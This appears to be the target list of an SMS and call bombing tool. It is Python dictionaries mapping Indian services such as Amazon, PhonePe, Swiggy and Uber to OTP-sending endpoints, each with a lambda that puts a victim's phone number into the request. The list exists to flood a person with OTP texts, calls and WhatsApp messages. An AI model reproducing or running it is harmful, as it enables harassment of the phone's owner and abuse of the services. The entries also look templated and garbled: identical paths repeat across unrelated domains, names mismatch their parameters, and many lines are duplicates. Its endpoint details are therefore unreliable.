    {'name': 'Wakefit WhatsApp', 'url': 'https://wakefit.co/api/v2/auth/send-otp', 'method': 'POST', 'headers': {'Content-Type': 'application/json'}, 'data': lambda phone: {"number": phone, "otpOnCall": True}},
    {'name': 'Phonepe Call', 'url': 'https://phonepe.com/api/v2/otpgenerate', 'method': 'POST', 'headers': {'Content-Type': 'application/json'}, 'data': lambda phone: {"mobile": phone}},
    {'name': 'Zivame SMS', 'url': 'https://zivame.com/api/v3/user/otp', 'method': 'POST', 'headers': {'Content-Type': 'application/json'}, 'data': lambda phone: {"mobile": phone}},
    {'name': 'Phonepe Call', 'url': 'https://phonepe.com/v1/user/otplogin', 'method': 'POST', 'headers': {'Content-Type': 'application/json'}, 'data': lambda phone: {"phoneNumber": phone, "otpType": "voice"}},
    {'name': 'Ajio SMS', 'url': 'https://ajio.com/api/v1/customers/sendOtp', 'method': 'POST', 'headers': {'Content-Type': 'application/json'}, 'data': lambda phone: {"mobile": phone}},
    {'name': 'Makemytrip Call', 'url': 'https://makemytrip.com/api/v2/otpgenerate', 'method': 'POST', 'headers': {'Content-Type': 'application/json'}, 'data': lambda phone: {"phoneNumber": phone, "otpType": "voice"}},
    {'name': 'Zivame SMS', 'url': 'https://zivame.com/v3/auth/otp', 'method': 'POST', 'headers': {'Content-Type': 'application/json'}, 'data': lambda phone: {"number": phone, "otpOnCall": True}},
    {'name': 'Newme Call', 'url': 'https://newme.asia/api/v1/auth/otpsend', 'method': 'POST', 'headers': {'Content-Type': 'application/json'}, 'data': lambda phone: {"number": phone, "otpOnCall": True}},
    {'name': 'Amazon SMS', 'url': 'https://amazon.in/api/v2/auth/send-otp', 'method': 'POST', 'headers': {'Content-Type': 'application/json'}, 'data': lambda phone: {"mobile": phone}},
    {'name': 'Newme SMS', 'url': 'https://newme.asia/v3/auth/otp', 'method': 'POST', 'headers': {'Content-Type': 'application/json'}, 'data': lambda phone: {"mobile": phone}},
    {'name': 'Meesho WhatsApp', 'url': 'https://meesho.com/v1/user/otplogin', 'method': 'POST', 'headers': {'Content-Type': 'application/json'}, 'data': lambda phone: {"phone": phone, "countryCode": "91"}},
    {'name': 'Zepto Call', 'url': 'https://zepto.com/api/v2/auth/send-otp', 'method': 'POST', 'headers': {'Content-Type': 'application/json'}, 'data': lambda phone: {"mobileNumber": phone}},
    {'name': 'Makemytrip WhatsApp', 'url': 'https://makemytrip.com/api/v1/auth/otpsend', 'method': 'POST', 'headers': {'Content-Type': 'application/json'}, 'data': lambda phone: {"mobile": phone}},
    {'name': 'Instamart Call', 'url': 'https://instamart.com/api/v2/auth/send-otp', 'method': 'POST', 'headers': {'Content-Type': 'application/json'}, 'data': lambda phone: {"phone": phone, "countryCode": "91"}},
    {'name': 'Api-Gateway WhatsApp', 'url': 'https://api-gateway.juno.lenskart.com/api/v2/otpgenerate', 'method': 'POST', 'headers': {'Content-Type': 'application/json'}, 'data': lambda phone: {"mobileNumber": phone}},
    {'name': 'Zepto Call', 'url': 'https://zepto.com/api/v1/auth/otpsend', 'method': 'POST', 'headers': {'Content-Type': 'application/json'}, 'data': lambda phone: {"phoneNumber": phone, "otpType": "voice"}},
    {'name': 'Uber Call', 'url': 'https://uber.com/v3/auth/otp', 'method': 'POST', 'headers': {'Content-Type': 'application/json'}, 'data': lambda phone: {"phone": phone, "countryCode": "91"}},
    {'name': 'Cred Call', 'url': 'https://cred.club/api/v1/customers/sendOtp', 'method': 'POST', 'headers': {'Content-Type': 'application/json'}, 'data': lambda phone: {"number": phone, "otpOnCall": True}},
    {'name': 'Khatabook WhatsApp', 'url': 'https://khatabook.com/api/v1/customers/sendOtp', 'method': 'POST', 'headers': {'Content-Type': 'application/json'}, 'data': lambda phone: {"mobile": phone}},
    {'name': 'Newme Call', 'url': 'https://newme.asia/api/v2/otpgenerate', 'method': 'POST', 'headers': {'Content-Type': 'application/json'}, 'data': lambda phone: {"mobile": phone}},
    {'name': 'Gokwik SMS', 'url': 'https://gokwik.co/api/v1/customers/sendOtp', 'method': 'POST', 'headers': {'Content-Type': 'application/json'}, 'data': lambda phone: {"mobile": phone}},
    {'name': 'Phonepe Call', 'url': 'https://phonepe.com/v1/user/otplogin', 'method': 'POST', 'headers': {'Content-Type': 'application/json'}, 'data': lambda phone: {"number": phone, "otpOnCall": True}},
    {'name': 'Bigbasket Call', 'url': 'https://bigbasket.com/v1/user/otplogin', 'method': 'POST', 'headers': {'Content-Type': 'application/json'}, 'data': lambda phone: {"mobileNumber": phone}},
    {'name': 'Gokwik WhatsApp', 'url': 'https://gokwik.co/api/v2/otpgenerate', 'method': 'POST', 'headers': {'Content-Type': 'application/json'}, 'data': lambda phone: {"mobileNumber": phone}},
    {'name': 'Tatacapital SMS', 'url': 'https://tatacapital.com/api/v3/user/otp', 'method': 'POST', 'headers': {'Content-Type': 'application/json'}, 'data': lambda phone: {"phoneNumber": phone, "otpType": "voice"}},
    {'name': 'Zivame SMS', 'url': 'https://zivame.com/v1/user/otplogin', 'method': 'POST', 'headers': {'Content-Type': 'application/json'}, 'data': lambda phone: {"phoneNumber": phone, "otpType": "voice"}},
    {'name': 'Shiprocket Call', 'url': 'https://shiprocket.in/api/v3/user/otp', 'method': 'POST', 'headers': {'Content-Type': 'application/json'}, 'data': lambda phone: {"phone": phone, "countryCode": "91"}},
    {'name': 'Rapido WhatsApp', 'url': 'https://rapido.bike/api/v2/login/sendotp', 'method': 'POST', 'headers': {'Content-Type': 'application/json'}, 'data': lambda phone: {"phone": phone, "countryCode": "91"}},
    {'name': 'Phonepe Call', 'url': 'https://phonepe.com/gw/login-register/v1/sendOTP', 'method': 'POST', 'headers': {'Content-Type': 'application/json'}, 'data': lambda phone: {"mobile": phone}},
    {'name': 'Goibibo SMS', 'url': 'https://goibibo.com/api/v2/auth/send-otp', 'method': 'POST', 'headers': {'Content-Type': 'application/json'}, 'data': lambda phone: {"phoneNumber": phone, "otpType": "voice"}},
    {'name': 'Tatacapital Call', 'url': 'https://tatacapital.com/v1/user/otplogin', 'method': 'POST', 'headers': {'Content-Type': 'application/json'}, 'data': lambda phone: {"mobileNumber": phone}},
    {'name': 'Myntra Call', 'url': 'https://myntra.com/api/v1/auth/otpsend', 'method': 'POST', 'headers': {'Content-Type': 'application/json'}, 'data': lambda phone: {"phoneNumber": phone, "otpType": "voice"}},
    {'name': 'Olacabs WhatsApp', 'url': 'https://olacabs.com/v1/user/otplogin', 'method': 'POST', 'headers': {'Content-Type': 'application/json'}, 'data': lambda phone: {"phone": phone, "countryCode": "91"}},
    {'name': 'Doubtnut WhatsApp', 'url': 'https://doubtnut.com/v3/auth/otp', 'method': 'POST', 'headers': {'Content-Type': 'application/json'}, 'data': lambda phone: {"mobile": phone}},
    {'name': 'Gokwik WhatsApp', 'url': 'https://gokwik.co/api/v2/login/sendotp', 'method': 'POST', 'headers': {'Content-Type': 'application/json'}, 'data': lambda phone: {"mobile": phone}},
    {'name': 'Blinkit WhatsApp', 'url': 'https://blinkit.com/api/v2/auth/send-otp', 'method': 'POST', 'headers': {'Content-Type': 'application/json'}, 'data': lambda phone: {"phoneNumber": phone, "otpType": "voice"}},
    {'name': 'Gokwik Call', 'url': 'https://gokwik.co/v3/auth/otp', 'method': 'POST', 'headers': {'Content-Type': 'application/json'}, 'data': lambda phone: {"phone": phone, "countryCode": "91"}},
    {'name': '1Mg SMS', 'url': 'https://1mg.com/v3/auth/otp', 'method': 'POST', 'headers': {'Content-Type': 'application/json'}, 'data': lambda phone: {"mobileNumber": phone}},
    {'name': 'Api-Gateway WhatsApp', 'url': 'https://api-gateway.juno.lenskart.com/api/v2/auth/send-otp', 'method': 'POST', 'headers': {'Content-Type': 'application/json'}, 'data': lambda phone: {"mobile": phone}},
    {'name': 'Olacabs SMS', 'url': 'https://olacabs.com/v3/auth/otp', 'method': 'POST', 'headers': {'Content-Type': 'application/json'}, 'data': lambda phone: {"mobileNumber": phone}},
    {'name': 'Uber SMS', 'url': 'https://uber.com/api/v1/auth/otpsend', 'method': 'POST', 'headers': {'Content-Type': 'application/json'}, 'data': lambda phone: {"phone": phone, "countryCode": "91"}},
    {'name': 'Blinkit WhatsApp', 'url': 'https://blinkit.com/api/v3/user/otp', 'method': 'POST', 'headers': {'Content-Type': 'application/json'}, 'data': lambda phone: {"mobile": phone}},
    {'name': 'Swiggy WhatsApp', 'url': 'https://swiggy.com/api/v2/otpgenerate', 'method': 'POST', 'headers': {'Content-Type': 'application/json'}, 'data': lambda phone: {"phone": phone, "countryCode": "91"}},
    {'name': 'Paytm SMS', 'url': 'https://paytm.com/api/v2/login/sendotp', 'method': 'POST', 'headers': {'Content-Type': 'application/json'}, 'data': lambda phone: {"number": phone, "otpOnCall": True}},
    {'name': 'Meesho Call', 'url': 'https://meesho.com/api/v2/otpgenerate', 'method': 'POST', 'headers': {'Content-Type': 'application/json'}, 'data': lambda phone: {"mobile": phone}},
    {'name': 'Api-Gateway SMS', 'url': 'https://api-gateway.juno.lenskart.com/api/v1/customers/sendOtp', 'method': 'POST', 'headers': {'Content-Type': 'application/json'}, 'data': lambda phone: {"mobileNumber": phone}},
    {'name': 'Pharmeasy Call', 'url': 'https://pharmeasy.in/v3/auth/otp', 'method': 'POST', 'headers': {'Content-Type': 'application/json'}, 'data': lambda phone: {"mobileNumber": phone}},
    {'name': 'Bigbasket WhatsApp', 'url': 'https://bigbasket.com/v1/user/otplogin', 'method': 'POST', 'headers': {'Content-Type': 'application/json'}, 'data': lambda phone: {"phone": phone, "countryCode": "91"}},
    {'name': 'Uber WhatsApp', 'url': 'https://uber.com/api/v2/login/sendotp', 'method': 'POST', 'headers': {'Content-Type': 'application/json'}, 'data': lambda phone: {"phone": phone, "countryCode": "91"}},
    {'name': 'Wakefit SMS', 'url': 'https://wakefit.co/v1/user/otplogin', 'method': 'POST', 'headers': {'Content-Type': 'application/json'}, 'data': lambda phone: {"mobile": phone}},
    {'name': 'Zomato WhatsApp', 'url': 'https://zomato.com/v3/auth/otp', 'method': 'POST', 'headers': {'Content-Type': 'application/json'}, 'data': lambda phone: {"mobile": phone}},
    {'name': 'Khatabook WhatsApp', 'url': 'https://khatabook.com/api/v1/customers/sendOtp', 'method': 'POST', 'headers': {'Content-Type': 'application/json'}, 'data': lambda phone: {"number": phone, "otpOnCall": True}},
    {'name': 'Wakefit WhatsApp', 'url': 'https://wakefit.co/v3/auth/otp', 'method': 'POST', 'headers': {'Content-Type': 'application/json'}, 'data': lambda phone: {"phoneNumber": phone, "otpType": "voice"}},
    {'name': 'Myntra WhatsApp', 'url': 'https://myntra.com/v3/auth/otp', 'method': 'POST', 'headers': {'Content-Type': 'application/json'}, 'data': lambda phone: {"phone": phone, "countryCode": "91"}},
    {'name': 'Gokwik WhatsApp', 'url': 'https://gokwik.co/gw/login-register/v1/sendOTP', 'method': 'POST', 'headers': {'Content-Type': 'application/json'}, 'data': lambda phone: {"number": phone, "otpOnCall": True}},
    {'name': 'Api-Gateway SMS', 'url': 'https://api-gateway.juno.lenskart.com/api/v3/user/otp', 'method': 'POST', 'headers': {'Content-Type': 'application/json'}, 'data': lambda phone: {"phone": phone, "countryCode": "91"}},
    {'name': 'Gokwik Call', 'url': 'https://gokwik.co/api/v1/auth/otpsend', 'method': 'POST', 'headers': {'Content-Type': 'application/json'}, 'data': lambda phone: {"phone": phone, "countryCode": "91"}},
    {'name': 'Myntra SMS', 'url': 'https://myntra.com/api/v2/otpgenerate', 'method': 'POST', 'headers': {'Content-Type': 'application/json'}, 'data': lambda phone: {"mobile": phone}},
    {'name': 'Zepto SMS', 'url': 'https://zepto.com/api/v3/user/otp', 'method': 'POST', 'headers': {'Content-Type': 'application/json'}, 'data': lambda phone: {"number": phone, "otpOnCall": True}},
    {'name': 'Doubtnut SMS', 'url': 'https://doubtnut.com/api/v2/auth/send-otp', 'method': 'POST', 'headers': {'Content-Type': 'application/json'}, 'data': lambda phone: {"phone": phone, "countryCode": "91"}},
    {'name': 'Phonepe Call', 'url': 'https://phonepe.com/api/v3/user/otp', 'method': 'POST', 'headers': {'Content-Type': 'application/json'}, 'data': lambda phone: {"number": phone, "otpOnCall": True}},
    {'name': 'Tatacapital Call', 'url': 'https://tatacapital.com/api/v2/login/sendotp', 'method': 'POST', 'headers': {'Content-Type': 'application/json'}, 'data': lambda phone: {"number": phone, "otpOnCall": True}},
    {'name': 'Shiprocket SMS', 'url': 'https://shiprocket.in/api/v2/otpgenerate', 'method': 'POST', 'headers': {'Content-Type': 'application/json'}, 'data': lambda phone: {"phoneNumber": phone, "otpType": "voice"}},
    {'name': 'Nykaa Call', 'url': 'https://nykaa.com/gw/login-register/v1/sendOTP', 'method': 'POST', 'headers': {'Content-Type': 'application/json'}, 'data': lambda phone: {"phoneNumber": phone, "otpType": "voice"}},
    {'name': 'Amazon SMS', 'url': 'https://amazon.in/api/v2/login/sendotp', 'method': 'POST', 'headers': {'Content-Type': 'application/json'}, 'data': lambda phone: {"mobileNumber": phone}},
    {'name': 'Doubtnut SMS', 'url': 'https://doubtnut.com/v3/auth/otp', 'method': 'POST', 'headers': {'Content-Type': 'application/json'}, 'data': lambda phone: {"phoneNumber": phone, "otpType": "voice"}},
    {'name': 'Flipkart Call', 'url': 'https://flipkart.com/api/v2/auth/send-otp', 'method': 'POST', 'headers': {'Content-Type': 'application/json'}, 'data': lambda phone: {"mobile": phone}},
    {'name': 'Bigbasket SMS', 'url': 'https://bigbasket.com/gw/login-register/v1/sendOTP', 'method': 'POST', 'headers': {'Content-Type': 'application/json'}, 'data': lambda phone: {"mobileNumber": phone}},
    {'name': 'Paytm Call', 'url': 'https://paytm.com/api/v2/otpgenerate', 'method': 'POST', 'headers': {'Content-Type': 'application/json'}, 'data': lambda phone: {"number": phone, "otpOnCall": True}},
    {'name': 'Meesho SMS', 'url': 'https://meesho.com/v1/user/otplogin', 'method': 'POST', 'headers': {'Content-Type': 'application/json'}, 'data': lambda phone: {"phoneNumber": phone, "otpType": "voice"}},
    {'name': 'Flipkart WhatsApp', 'url': 'https://flipkart.com/api/v2/auth/send-otp', 'method': 'POST', 'headers': {'Content-Type': 'application/json'}, 'data': lambda phone: {"number": phone, "otpOnCall": True}},
    {'name': 'Dmart WhatsApp', 'url': 'https://dmart.ready.in/api/v2/auth/send-otp', 'method': 'POST', 'headers': {'Content-Type': 'application/json'}, 'data': lambda phone: {"phone": phone, "countryCode": "91"}},
    {'name': 'Rapido SMS', 'url': 'https://rapido.bike/gw/login-register/v1/sendOTP', 'method': 'POST', 'headers': {'Content-Type': 'application/json'}, 'data': lambda phone: {"number": phone, "otpOnCall": True}},
    {'name': 'Pokerbaazi WhatsApp', 'url': 'https://pokerbaazi.com/v3/auth/otp', 'method': 'POST', 'headers': {'Content-Type': 'application/json'}, 'data': lambda phone: {"phone": phone, "countryCode": "91"}},
    {'name': 'Olacabs Call', 'url': 'https://olacabs.com/v3/auth/otp', 'method': 'POST', 'headers': {'Content-Type': 'application/json'}, 'data': lambda phone: {"phone": phone, "countryCode": "91"}},
    {'name': 'Goibibo WhatsApp', 'url': 'https://goibibo.com/v1/user/otplogin', 'method': 'POST', 'headers': {'Content-Type': 'application/json'}, 'data': lambda phone: {"phoneNumber": phone, "otpType": "voice"}},
    {'name': 'Pharmeasy SMS', 'url': 'https://pharmeasy.in/gw/login-register/v1/sendOTP', 'method': 'POST', 'headers': {'Content-Type': 'application/json'}, 'data': lambda phone: {"number": phone, "otpOnCall": True}},
    {'name': 'Ajio WhatsApp', 'url': 'https://ajio.com/api/v3/user/otp', 'method': 'POST', 'headers': {'Content-Type': 'application/json'}, 'data': lambda phone: {"phoneNumber": phone, "otpType": "voice"}},
    {'name': 'Blinkit WhatsApp', 'url': 'https://blinkit.com/v1/user/otplogin', 'method': 'POST', 'headers': {'Content-Type': 'application/json'}, 'data': lambda phone: {"mobileNumber": phone}},
    {'name': 'Wakefit Call', 'url': 'https://wakefit.co/gw/login-register/v1/sendOTP', 'method': 'POST', 'headers': {'Content-Type': 'application/json'}, 'data': lambda phone: {"phone": phone, "countryCode": "91"}},
    {'name': 'Phonepe Call', 'url': 'https://phonepe.com/api/v1/auth/otpsend', 'method': 'POST', 'headers': {'Content-Type': 'application/json'}, 'data': lambda phone: {"number": phone, "otpOnCall": True}},
    {'name': 'Goibibo Call', 'url': 'https://goibibo.com/api/v1/customers/sendOtp', 'method': 'POST', 'headers': {'Content-Type': 'application/json'}, 'data': lambda phone: {"phoneNumber": phone, "otpType": "voice"}},
    {'name': 'Meesho SMS', 'url': 'https://meesho.com/v3/auth/otp', 'method': 'POST', 'headers': {'Content-Type': 'application/json'}, 'data': lambda phone: {"number": phone, "otpOnCall": True}},
    {'name': 'Blinkit SMS', 'url': 'https://blinkit.com/api/v3/user/otp', 'method': 'POST', 'headers': {'Content-Type': 'application/json'}, 'data': lambda phone: {"number": phone, "otpOnCall": True}},
    {'name': 'Api-Gateway Call', 'url': 'https://api-gateway.juno.lenskart.com/api/v2/otpgenerate', 'method': 'POST', 'headers': {'Content-Type': 'application/json'}, 'data': lambda phone: {"mobileNumber": phone}},
    {'name': 'Goibibo Call', 'url': 'https://goibibo.com/api/v2/login/sendotp', 'method': 'POST', 'headers': {'Content-Type': 'application/json'}, 'data': lambda phone: {"number": phone, "otpOnCall": True}},
    {'name': 'Makemytrip Call', 'url': 'https://makemytrip.com/gw/login-register/v1/sendOTP', 'method': 'POST', 'headers': {'Content-Type': 'application/json'}, 'data': lambda phone: {"mobile": phone}},
    {'name': 'Dmart Call', 'url': 'https://dmart.ready.in/v1/user/otplogin', 'method': 'POST', 'headers': {'Content-Type': 'application/json'}, 'data': lambda phone: {"number": phone, "otpOnCall": True}},
    {'name': 'Dmart WhatsApp', 'url': 'https://dmart.ready.in/api/v1/auth/otpsend', 'method': 'POST', 'headers': {'Content-Type': 'application/json'}, 'data': lambda phone: {"mobileNumber": phone}},
    {'name': 'Goibibo SMS', 'url': 'https://goibibo.com/gw/login-register/v1/sendOTP', 'method': 'POST', 'headers': {'Content-Type': 'application/json'}, 'data': lambda phone: {"phoneNumber": phone, "otpType": "voice"}},
    {'name': 'Oyorooms WhatsApp', 'url': 'https://oyorooms.com/api/v2/login/sendotp', 'method': 'POST', 'headers': {'Content-Type': 'application/json'}, 'data': lambda phone: {"phone": phone, "countryCode": "91"}},
    {'name': 'Doubtnut SMS', 'url': 'https://doubtnut.com/api/v1/customers/sendOtp', 'method': 'POST', 'headers': {'Content-Type': 'application/json'}, 'data': lambda phone: {"phone": phone, "countryCode": "91"}},
    {'name': 'Blinkit SMS', 'url': 'https://blinkit.com/api/v2/otpgenerate', 'method': 'POST', 'headers': {'Content-Type': 'application/json'}, 'data': lambda phone: {"number": phone, "otpOnCall": True}},
    {'name': 'Jupiter WhatsApp', 'url': 'https://jupiter.money/api/v1/auth/otpsend', 'method': 'POST', 'headers': {'Content-Type': 'application/json'}, 'data': lambda phone: {"number": phone, "otpOnCall": True}},
    {'name': 'Jupiter SMS', 'url': 'https://jupiter.money/api/v3/user/otp', 'method': 'POST', 'headers': {'Content-Type': 'application/json'}, 'data': lambda phone: {"mobileNumber": phone}},
    {'name': 'Api-Gateway WhatsApp', 'url': 'https://api-gateway.juno.lenskart.com/v1/user/otplogin', 'method': 'POST', 'headers': {'Content-Type': 'application/json'}, 'data': lambda phone: {"number": phone, "otpOnCall": True}},
    {'name': 'Zomato SMS', 'url': 'https://zomato.com/api/v2/auth/send-otp', 'method': 'POST', 'headers': {'Content-Type': 'application/json'}, 'data': lambda phone: {"phone": phone, "countryCode": "91"}},
    {'name': 'Instamart Call', 'url': 'https://instamart.com/api/v1/customers/sendOtp', 'method': 'POST', 'headers': {'Content-Type': 'application/json'}, 'data': lambda phone: {"mobile": phone}},
    {'name': 'Amazon WhatsApp', 'url': 'https://amazon.in/gw/login-register/v1/sendOTP', 'method': 'POST', 'headers': {'Content-Type': 'application/json'}, 'data': lambda phone: {"phone": phone, "countryCode": "91"}},
    {'name': 'Khatabook WhatsApp', 'url': 'https://khatabook.com/api/v1/customers/sendOtp', 'method': 'POST', 'headers': {'Content-Type': 'application/json'}, 'data': lambda phone: {"number": phone, "otpOnCall": True}},
    {'name': 'Shiprocket WhatsApp', 'url': 'https://shiprocket.in/api/v1/auth/otpsend', 'method': 'POST', 'headers': {'Content-Type': 'application/json'}, 'data': lambda phone: {"mobileNumber": phone}},
    {'name': 'Rapido WhatsApp', 'url': 'https://rapido.bike/v1/user/otplogin', 'method': 'POST', 'headers': {'Content-Type': 'application/json'}, 'data': lambda phone: {"mobileNumber": phone}},
    {'name': 'Pharmeasy WhatsApp', 'url': 'https://pharmeasy.in/api/v2/login/sendotp', 'method': 'POST', 'headers': {'Content-Type': 'application/json'}, 'data': lambda phone: {"mobile": phone}},
    {'name': 'Phonepe Call', 'url': 'https://phonepe.com/api/v2/login/sendotp', 'method': 'POST', 'headers': {'Content-Type': 'application/json'}, 'data': lambda phone: {"phoneNumber": phone, "otpType": "voice"}},
    {'name': 'Pharmeasy WhatsApp', 'url': 'https://pharmeasy.in/api/v2/login/sendotp', 'method': 'POST', 'headers': {'Content-Type': 'application/json'}, 'data': lambda phone: {"number": phone, "otpOnCall": True}},
    {'name': 'Gokwik WhatsApp', 'url': 'https://gokwik.co/api/v2/otpgenerate', 'method': 'POST', 'headers': {'Content-Type': 'application/json'}, 'data': lambda phone: {"mobile": phone}},
    {'name': 'Pokerbaazi Call', 'url': 'https://pokerbaazi.com/gw/login-register/v1/sendOTP', 'method': 'POST', 'headers': {'Content-Type': 'application/json'}, 'data': lambda phone: {"number": phone, "otpOnCall": True}},
    {'name': 'Swiggy WhatsApp', 'url': 'https://swiggy.com/v3/auth/otp', 'method': 'POST', 'headers': {'Content-Type': 'application/json'}, 'data': lambda phone: {"phone": phone, "countryCode": "91"}},
    {'name': 'Oyorooms WhatsApp', 'url': 'https://oyorooms.com/api/v1/customers/sendOtp', 'method': 'POST', 'headers': {'Content-Type': 'application/json'}, 'data': lambda phone: {"mobile": phone}},
    {'name': 'Rapido WhatsApp', 'url': 'https://rapido.bike/gw/login-register/v1/sendOTP', 'method': 'POST', 'headers': {'Content-Type': 'application/json'}, 'data': lambda phone: {"phone": phone, "countryCode": "91"}},
    {'name': 'Myntra Call', 'url': 'https://myntra.com/api/v2/otpgenerate', 'method': 'POST', 'headers': {'Content-Type': 'application/json'}, 'data': lambda phone: {"phone": phone, "countryCode": "91"}},
    {'name': 'Myntra SMS', 'url': 'https://myntra.com/api/v3/user/otp', 'method': 'POST', 'headers': {'Content-Type': 'application/json'}, 'data': lambda phone: {"phoneNumber": phone, "otpType": "voice"}},
    {'name': 'Dmart Call', 'url': 'https://dmart.ready.in/v3/auth/otp', 'method': 'POST', 'headers': {'Content-Type': 'application/json'}, 'data': lambda phone: {"mobile": phone}},
    {'name': 'Wakefit WhatsApp', 'url': 'https://wakefit.co/v3/auth/otp', 'method': 'POST', 'headers': {'Content-Type': 'application/json'}, 'data': lambda phone: {"phoneNumber": phone, "otpType": "voice"}},
    {'name': 'Pharmeasy SMS', 'url': 'https://pharmeasy.in/api/v2/login/sendotp', 'method': 'POST', 'headers': {'Content-Type': 'application/json'}, 'data': lambda phone: {"number": phone, "otpOnCall": True}},
    {'name': 'Newme Call', 'url': 'https://newme.asia/api/v2/login/sendotp', 'method': 'POST', 'headers': {'Content-Type': 'application/json'}, 'data': lambda phone: {"mobile": phone}},
    {'name': 'Doubtnut WhatsApp', 'url': 'https://doubtnut.com/v1/user/otplogin', 'method': 'POST', 'headers': {'Content-Type': 'application/json'}, 'data': lambda phone: {"phoneNumber": phone, "otpType": "voice"}},
    {'name': 'Myntra SMS', 'url': 'https://myntra.com/gw/login-register/v1/sendOTP', 'method': 'POST', 'headers': {'Content-Type': 'application/json'}, 'data': lambda phone: {"mobileNumber": phone}},
    {'name': 'Phonepe SMS', 'url': 'https://phonepe.com/api/v2/otpgenerate', 'method': 'POST', 'headers': {'Content-Type': 'application/json'}, 'data': lambda phone: {"mobileNumber": phone}},
    {'name': 'Newme WhatsApp', 'url': 'https://newme.asia/api/v1/customers/sendOtp', 'method': 'POST', 'headers': {'Content-Type': 'application/json'}, 'data': lambda phone: {"mobileNumber": phone}},
    {'name': 'Cred WhatsApp', 'url': 'https://cred.club/v3/auth/otp', 'method': 'POST', 'headers': {'Content-Type': 'application/json'}, 'data': lambda phone: {"number": phone, "otpOnCall": True}},
    {'name': 'Instamart Call', 'url': 'https://instamart.com/api/v2/otpgenerate', 'method': 'POST', 'headers': {'Content-Type': 'application/json'}, 'data': lambda phone: {"mobile": phone}},
    {'name': 'Pokerbaazi Call', 'url': 'https://pokerbaazi.com/v1/user/otplogin', 'method': 'POST', 'headers': {'Content-Type': 'application/json'}, 'data': lambda phone: {"phoneNumber": phone, "otpType": "voice"}},
    {'name': 'Blinkit SMS', 'url': 'https://blinkit.com/api/v2/otpgenerate', 'method': 'POST', 'headers': {'Content-Type': 'application/json'}, 'data': lambda phone: {"mobileNumber": phone}},
    {'name': 'Bigbasket Call', 'url': 'https://bigbasket.com/api/v1/auth/otpsend', 'method': 'POST', 'headers': {'Content-Type': 'application/json'}, 'data': lambda phone: {"phone": phone, "countryCode": "91"}},
    {'name': 'Blinkit WhatsApp', 'url': 'https://blinkit.com/api/v1/auth/otpsend', 'method': 'POST', 'headers': {'Content-Type': 'application/json'}, 'data': lambda phone: {"phone": phone, "countryCode": "91"}},
    {'name': 'Wakefit SMS', 'url': 'https://wakefit.co/api/v2/otpgenerate', 'method': 'POST', 'headers': {'Content-Type': 'application/json'}, 'data': lambda phone: {"phoneNumber": phone, "otpType": "voice"}},
    {'name': 'Flipkart WhatsApp', 'url': 'https://flipkart.com/api/v3/user/otp', 'method': 'POST', 'headers': {'Content-Type': 'application/json'}, 'data': lambda phone: {"phoneNumber": phone, "otpType": "voice"}},
    {'name': 'Phonepe WhatsApp', 'url': 'https://phonepe.com/api/v1/customers/sendOtp', 'method': 'POST', 'headers': {'Content-Type': 'application/json'}, 'data': lambda phone: {"number": phone, "otpOnCall": True}},
    {'name': 'Zivame WhatsApp', 'url': 'https://zivame.com/v3/auth/otp', 'method': 'POST', 'headers': {'Content-Type': 'application/json'}, 'data': lambda phone: {"mobileNumber": phone}},
    {'name': 'Zepto SMS', 'url': 'https://zepto.com/v1/user/otplogin', 'method': 'POST', 'headers': {'Content-Type': 'application/json'}, 'data': lambda phone: {"mobile": phone}},
    {'name': 'Newme SMS', 'url': 'https://newme.asia/v3/auth/otp', 'method': 'POST', 'headers': {'Content-Type': 'application/json'}, 'data': lambda phone: {"mobile": phone}},
    {'name': 'Zepto WhatsApp', 'url': 'https://zepto.com/api/v2/login/sendotp', 'method': 'POST', 'headers': {'Content-Type': 'application/json'}, 'data': lambda phone: {"mobileNumber": phone}},
    {'name': 'Myntra Call', 'url': 'https://myntra.com/v3/auth/otp', 'method': 'POST', 'headers': {'Content-Type': 'application/json'}, 'data': lambda phone: {"number": phone, "otpOnCall": True}},
    {'name': 'Tatacapital SMS', 'url': 'https://tatacapital.com/api/v2/auth/send-otp', 'method': 'POST', 'headers': {'Content-Type': 'application/json'}, 'data': lambda phone: {"mobile": phone}},
    {'name': 'Pharmeasy Call', 'url': 'https://pharmeasy.in/api/v3/user/otp', 'method': 'POST', 'headers': {'Content-Type': 'application/json'}, 'data': lambda phone: {"number": phone, "otpOnCall": True}},
    {'name': 'Newme Call', 'url': 'https://newme.asia/api/v3/user/otp', 'method': 'POST', 'headers': {'Content-Type': 'application/json'}, 'data': lambda phone: {"number": phone, "otpOnCall": True}},
    {'name': 'Shiprocket SMS', 'url': 'https://shiprocket.in/api/v2/login/sendotp', 'method': 'POST', 'headers': {'Content-Type': 'application/json'}, 'data': lambda phone: {"phoneNumber": phone, "otpType": "voice"}},
    {'name': 'Nykaa WhatsApp', 'url': 'https://nykaa.com/api/v3/user/otp', 'method': 'POST', 'headers': {'Content-Type': 'application/json'}, 'data': lambda phone: {"phone": phone, "countryCode": "91"}},
    {'name': 'Makemytrip Call', 'url': 'https://makemytrip.com/v3/auth/otp', 'method': 'POST', 'headers': {'Content-Type': 'application/json'}, 'data': lambda phone: {"number": phone, "otpOnCall": True}},
    {'name': 'Flipkart Call', 'url': 'https://flipkart.com/api/v1/customers/sendOtp', 'method': 'POST', 'headers': {'Content-Type': 'application/json'}, 'data': lambda phone: {"number": phone, "otpOnCall": True}},
    {'name': 'Uber SMS', 'url': 'https://uber.com/gw/login-register/v1/sendOTP', 'method': 'POST', 'headers': {'Content-Type': 'application/json'}, 'data': lambda phone: {"mobileNumber": phone}},
    {'name': 'Uber SMS', 'url': 'https://uber.com/api/v2/otpgenerate', 'method': 'POST', 'headers': {'Content-Type': 'application/json'}, 'data': lambda phone: {"number": phone, "otpOnCall": True}},
    {'name': 'Api-Gateway SMS', 'url': 'https://api-gateway.juno.lenskart.com/api/v2/login/sendotp', 'method': 'POST', 'headers': {'Content-Type': 'application/json'}, 'data': lambda phone: {"mobileNumber": phone}},
    {'name': 'Zepto SMS', 'url': 'https://zepto.com/api/v3/user/otp', 'method': 'POST', 'headers': {'Content-Type': 'application/json'}, 'data': lambda phone: {"number": phone, "otpOnCall": True}},
    {'name': 'Khatabook WhatsApp', 'url': 'https://khatabook.com/api/v2/login/sendotp', 'method': 'POST', 'headers': {'Content-Type': 'application/json'}, 'data': lambda phone: {"number": phone, "otpOnCall": True}},
    {'name': 'Flipkart WhatsApp', 'url': 'https://flipkart.com/api/v1/auth/otpsend', 'method': 'POST', 'headers': {'Content-Type': 'application/json'}, 'data': lambda phone: {"number": phone, "otpOnCall": True}},
